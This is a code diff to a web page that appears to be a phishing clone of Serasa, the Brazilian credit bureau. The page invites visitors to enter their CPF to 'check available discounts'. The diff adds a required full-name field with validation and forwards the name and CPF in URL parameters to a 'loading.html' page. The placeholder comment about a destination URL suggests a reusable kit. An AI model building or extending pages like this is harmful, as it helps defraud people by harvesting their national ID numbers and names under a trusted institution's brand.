@@ -1345,7 +1345,7 @@
             >
               <div class="elementor-widget-container">
                 <p>
-                  Olá, Digite seu CPF para falar com um atendente e consultar os
+                  Olá, Digite seu CPF e nome para falar com um atendente e consultar os
                   descontos disponíveis para você!
                 </p>
               </div>
@@ -1370,6 +1370,29 @@
                   <input type="hidden" name="queried_id" value="12" />
 
                   <div class="elementor-form-fields-wrapper elementor-labels-">
+                    <!-- Campo de Nome (Novo) -->
+                    <div
+                      class="elementor-field-type-text elementor-field-group elementor-column elementor-field-group-nome elementor-col-100 elementor-field-required"
+                    >
+                      <label
+                        for="form-field-nome"
+                        class="elementor-field-label elementor-screen-only"
+                      >
+                        Nome Completo
+                      </label>
+                      <input
+                        size="1"
+                        type="text"
+                        name="form_fields[nome]"
+                        id="form-field-nome"
+                        class="elementor-field elementor-size-md elementor-field-textual"
+                        placeholder="Digite seu nome completo"
+                        required="required"
+                        aria-required="true"
+                      />
+                    </div>
+                    
+                    <!-- Campo de CPF (Existente) -->
                     <div
                       class="elementor-field-type-text elementor-field-group elementor-column elementor-field-group-cpf_cnpj elementor-col-100 elementor-field-required"
                     >
@@ -1853,9 +1876,16 @@
         const cpfForm = document.getElementById("serasa-cpf-form"); // Usa o ID do formulário
 
         if (cpfForm) {
+          const nomeInput = cpfForm.querySelector("#form-field-nome"); // Campo de nome
           const cpfInput = cpfForm.querySelector("#form-field-cpf_cnpj"); // Procura dentro do formulário
           const cpfErrorMessage = cpfForm.querySelector("#cpf-error-message"); // Procura dentro do formulário
 
+          if (!nomeInput) {
+            console.error(
+              "Campo de input Nome (id='form-field-nome') não encontrado dentro do formulário."
+            );
+            return;
+          }
           if (!cpfInput) {
             console.error(
               "Campo de input CPF (id='form-field-cpf_cnpj') não encontrado dentro do formulário."
@@ -1871,8 +1901,16 @@
           cpfForm.addEventListener("submit", function (event) {
             event.preventDefault();
 
+            let nomeValue = nomeInput.value.trim();
             let cpfValue = cpfInput.value.replace(/\D/g, "");
             let isValid = true;
+
+            // Validação do Nome
+            if (nomeValue === "" || nomeValue.length < 2) {
+              alert("Por favor, digite seu nome completo.");
+              nomeInput.focus();
+              return;
+            }
 
             // Validação de CPF (mesma lógica da resposta anterior)
             if (cpfValue.length !== 11) {
@@ -1926,6 +1964,7 @@
             const nextPageBaseUrl = "./loading.html"; // SUBSTITUA PELA SUA URL DE DESTINO CORRETA
 
             let currentUrlParams = new URLSearchParams(window.location.search);
+            currentUrlParams.set("nome", encodeURIComponent(nomeValue));
             currentUrlParams.set("cpf", cpfValue);
 
             window.location.href =
